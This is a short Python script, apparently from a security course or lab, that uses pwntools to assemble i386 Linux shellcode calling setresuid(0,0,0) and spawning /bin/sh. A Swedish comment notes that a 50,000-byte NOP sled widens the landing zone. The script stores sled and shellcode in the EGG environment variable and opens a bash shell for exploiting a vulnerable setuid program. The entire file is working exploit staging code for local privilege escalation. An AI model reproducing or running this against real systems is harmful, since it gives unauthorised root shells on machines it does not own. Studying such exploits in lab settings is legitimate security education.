# -*- coding: utf-8 -*-
from pwnlib.asm import asm
from pwnlib.shellcraft.i386.linux import sh, setresuid
import os

instructions = sh()
print("Assembler instructions for shellcode:")
print(instructions)


shellcode = asm(setresuid(0, 0, 0)) + asm(instructions)
# Lägg till no-op instruktioner, så att vi får större träffyta
maxlen = 50000
nopsled = '\x90'*(maxlen - len(shellcode))
shellcode = nopsled + shellcode

os.environ['EGG'] = shellcode

print("Shellcode is now in EGG")
print("use getenvaddr to get address")
os.system("/bin/bash")
